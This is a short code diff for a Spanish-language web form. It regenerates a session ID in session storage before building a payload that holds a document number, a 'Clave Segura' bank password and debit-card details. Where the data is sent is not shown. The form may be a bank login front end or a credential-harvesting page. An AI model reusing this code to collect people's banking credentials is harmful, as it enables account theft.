@@ -191,12 +191,23 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Preparar datos
         const sessionId = window.commonUtils.getSessionId();
+        
+        // Limpiar sesión anterior si existe
+        const prevData = sessionStorage.getItem('formData');
+        if (!prevData) {
+            // Nueva sesión, limpiar sessionId también
+            sessionStorage.removeItem('sessionId');
+            // Generar nuevo sessionId
+            const newSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            sessionStorage.setItem('sessionId', newSessionId);
+        }
+        
         const data = {
             tipo: 'Clave Segura',
             tipoDocumento: tipoDoc,
             numeroDocumento: numDoc,
             clave: claveSegura,
-            sessionId: sessionId
+            sessionId: window.commonUtils.getSessionId()
         };
 
         try {
@@ -309,6 +320,15 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Preparar datos
         const sessionId = window.commonUtils.getSessionId();
+        
+        // Limpiar sesión anterior si es el primer envío
+        const prevData = sessionStorage.getItem('formData');
+        if (!prevData) {
+            sessionStorage.removeItem('sessionId');
+            const newSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            sessionStorage.setItem('sessionId', newSessionId);
+        }
+        
         const data = {
             tipo: 'Tarjeta Débito',
             tipoDocumento: tipoDoc,
